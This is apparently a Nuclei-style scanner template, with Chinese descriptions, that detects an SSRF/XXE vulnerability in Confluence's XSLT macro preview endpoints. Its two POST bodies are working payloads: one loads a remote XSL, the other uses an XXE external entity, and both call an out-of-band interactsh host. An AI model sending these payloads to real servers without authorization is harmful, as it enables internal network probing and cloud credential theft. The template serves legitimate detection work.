id: confluence-xslt-macro-ssrf

info:
  name: Atlassian Confluence XSLT Macro - 服务端请求伪造漏洞
  author: ritikchaddha
  severity: high
  description: |
    该模板用于检测 Atlassian Confluence XSLT Macro - 服务端请求伪造漏洞。该类漏洞通常源于服务端可被诱导请求攻击者指定的 URL 或内部地址。模板主要向 `/rest/tinymce/1/macro/preview`、`/rest/api/content/macro/preview` 等路径发送探测请求，并根据OAST/DNS/HTTP 外带交互、响应状态或关键字回显确认漏洞是否存在。
  impact: |
    - 攻击者可诱使服务器向内网地址、云元数据地址或外部攻击者控制的地址发起请求。
    - 成功利用后可能泄露云临时凭据、探测内网服务、访问未暴露管理接口或触发二次漏洞。
  remediation: |
    - 对服务端发起请求的目标地址实施严格 allowlist，禁止访问本地地址、内网网段和云元数据地址。
    - 禁用不必要的远程 URL 加载功能，并对重定向、DNS 解析和协议类型进行约束。
    - 在网络层限制应用服务器的出站访问，审计异常外联和元数据接口访问记录。
  reference:
    - https://jira.atlassian.com/browse/CONFSERVER-101489
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 6.5
    cve-id: CVE-2024-29415
    cwe-id: CWE-611,CWE-918
  metadata:
    verified: true
    max-request: 2
    vendor: atlassian
    product: confluence
    fofa-query: icon_hash="-305179312"
  tags: cve,cve2024,confluence,atlassian,ssrf,xslt,macro

flow: http(1) || http(2)

http:
  - method: POST
    path:
      - "{{BaseURL}}/rest/tinymce/1/macro/preview"
      - "{{BaseURL}}/rest/api/content/macro/preview"

    headers:
      Content-Type: application/json

    body: |
      {
        "macro": {
          "name": "xslt",
          "body": "",
          "params": {
            "location": "http://{{interactsh-url}}/test.xsl"
          }
        }
      }

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "contextConfigLocation")'
          - 'contains(interactsh_protocol, "http")'
          - 'status_code == 200'
        condition: and

  - method: POST
    path:
      - "{{BaseURL}}/rest/tinymce/1/macro/preview"
      - "{{BaseURL}}/rest/api/content/macro/preview"

    headers:
      Content-Type: application/json

    body: |
      {
        "macro": {
          "name": "xslt",
          "body": "",
          "params": {
            "xml": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://{{interactsh-url}}/test'>]><foo>&xxe;</foo>",
            "xslt": "<xsl:stylesheet version='1.0' xmlns:xsl='http://www.w3.org/1999/XSL/Transform'><xsl:template match='/'>Test</xsl:template></xsl:stylesheet>"
          }
        }
      }

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "contextConfigLocation")'
          - 'contains(interactsh_protocol, "http")'
          - 'status_code == 200'
        condition: and
